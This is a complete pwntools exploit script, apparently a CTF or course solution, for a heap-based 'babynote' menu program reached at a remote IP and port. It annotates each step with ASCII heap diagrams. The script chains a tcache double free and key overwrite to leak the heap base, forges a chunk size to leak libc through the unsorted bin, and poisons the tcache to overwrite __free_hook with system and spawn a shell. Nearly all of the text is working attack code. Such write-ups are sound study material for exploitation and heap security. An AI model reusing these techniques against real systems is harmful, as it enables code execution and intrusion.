from pwn import *

def create(size, data):
    r.sendlineafter('>', '1')
    r.sendlineafter('size : ', str(size))
    r.sendafter('Content : ', data)


def show(index):
    r.sendlineafter('>', '2')
    r.sendlineafter('index : ', str(index))
    return r.recvuntil('\n========', drop=True)


def edit(index, data):
    r.sendlineafter('>', '3')
    r.sendlineafter('index : ', str(index))
    r.sendafter('Content : ', data)


def delete(index):
    r.sendlineafter('>', '4')
    r.sendlineafter('index : ', str(index))


r = remote('140.112.31.97', 30203)
# r = process('./B', env={'LD_PRELOAD': './libc-2.31.so'})
# r = process('./babynote')

print('main arena')
'''
x/40gx &__malloc_hook
fastbin        
unsorted bin   
small bin      
large bin
'''
'''
heap      tcache
heap+0x10 addr
'''

# leak heap base
input('ready to leak heap base')
create(0x18, 'M30W')  # 0
'''
                note:
                0
| tcache |      | chunk0 | 0x21 | 
| NULL   |      | M30W   | 0000 |
'''
delete(0)
'''
                note: 
count: 1        0
| tcache |  ->  | chunk0 | 0x21 | 
| chunk0 |      | NULL   | key  |
'''
create(0x18, 'M30W')  # 1
''' 
                note:     
                0, 1
| tcache |      | chunk1 | 0x21 | 
| chunk0 |      | M30W   | 0000 |
'''
delete(0)
'''
                note:     
count: 1        0, 1
| tcache |  ->  | chunk1 | 0x21 | 
| chunk1 |      | NULL   | NULL |
'''
for i in range(4):
    # chunk1->key = 0
    edit(1, p64(0) + p64(0))
    '''
    note:           0, 1
    | tcache |  ->  | chunk1 | 0x21 | 
    | chunk1 |      | 0      | 0    |
    '''
    # double free
    delete(0)
    '''
                    note:            
    count: 5        0, 1
    | tcache |  ->  | chunk1 | 0x21 | 
    | chunk1 |    ^-| chunk1 | 0    |
    '''
chunk1_addr = show(1)
heap_base = u64(chunk1_addr + b'\x00\x00') - 0x2a0
print('heap_base', hex(heap_base))

# leak libc base (double linked list: unsorted bin, small bin)
# size is limited to fast bin,
# so need to first change size then free it. -> unsorted bin
input('ready to leak libc base')
create(0x78, 'M30W')  # 2
# padding + guard chunk
create(0x78, b'\x00'*0x48 + p64(0x21) + b'\x00'*0x18 + p64(0x21))  # 3
input('check')
'''
                note            
count: 0        2
| tcache |      | chunk2 | 0x81 |
| NULL   |      | M30W   | 0000 |
       
                3
                | chunk3 | 0x81 |
                | NULL   | key  |
                | 000000 | 0000 |
                | 000000 | 0000 |
                | 000000 | 0021 |
                | 000000 | 0000 |
                | 000000 | 0021 |
'''
delete(2)
'''
                note            
count: 1        2
| tcache |  ->  | chunk2 | 0x81 |
| chunk2 |      | NULL   | 0000 |
       
                3
                | chunk3 | 0x81 |
                | 000000 | 0000 |
                | 000000 | 0000 |
                | 000000 | 0021 |
                | 000000 | 0000 |
                | 000000 | 0021 |
'''
create(0x78, 'M30W')  # 4
'''
                note            
count: 0        2, 4
| tcache |      | chunk4 | 0x81 |
| NULL   |      | M30W   | 0000 |

                3
                | chunk3 | 0x81 |
                | 000000 | 0000 |
                | 000000 | 0000 |
                | 000000 | 0021 |
                | 000000 | 0000 |
                | 000000 | 0021 |
'''

# tcache dup to change size to 0xd1
chunk_to_change = heap_base + 0x2b0
create(0x18, p64(chunk_to_change))  # 5
create(0x18, p64(0) + p64(0) + p64(heap_base+0x2a0))  # 6
input('check2')
create(0x18, p64(0) + p64(0xd1))  # 7
'''
size: 0x20      note:            
count: 4         0, 1, 5
| tcache |  ->  | chunk1/5 | 0x21 | 
| chunk1 |      | fake     | 0    |
'''
'''
                note:            
                 0, 1, 5, 6
                | chunk1/6 | 0x21 | 
                | 000000   | 0000 |
size: 0x20       
count: 3        2, 4
| tcache |  ->  | +0x2a0   | 0x81 | 
| fake   |      | M30W     | 0000 |
'''
'''
size: 0x20      note:            
count: 2         0, 1, 5, 6
| tcache |      | chunk1/6 | 0x21 | 
| +0x2a0 |  ->  | 000000   | 0000 |
              
                2, 4, 7
                | +0x2a0  | 0xd1  |    0x2b0
                | M30W    | 0000  |
'''
input('check3')

# to fill tcache
for i in range(7):
    delete(2)
    # 4->key = 0
    edit(4, p64(0) + p64(0))

# to unsorted bin
delete(2)
'''
size:                         note:            
count: 1                      2, 4, 7
| unsorted | unsorted |       | +0x2a0     | 0xd1     |  +0x2b0
| +0x2b0   | +0x2b0   |  <->  | unsorted   | unsorted |
'''

main_arena_offset = 0x1ebb80
unsorted_bin_offset = 0x60 # 0x70?
libc_base = u64(show(4) + b'\x00\x00') - \
    unsorted_bin_offset - main_arena_offset
print('libc_base', hex(libc_base))

# overwrite free_hook
input('ready to overwrite free_hook')

free_hook_offset = 0x1eeb28 - 8
system_offset = 0x55410

edit(1, p64(libc_base + free_hook_offset))
create(0x18, 'M30W')  # 8
create(0x18, b'/bin/sh\x00' + p64(libc_base + system_offset))  # 9

# trigger free
input('ready to get shell')
delete(9)
r.interactive()
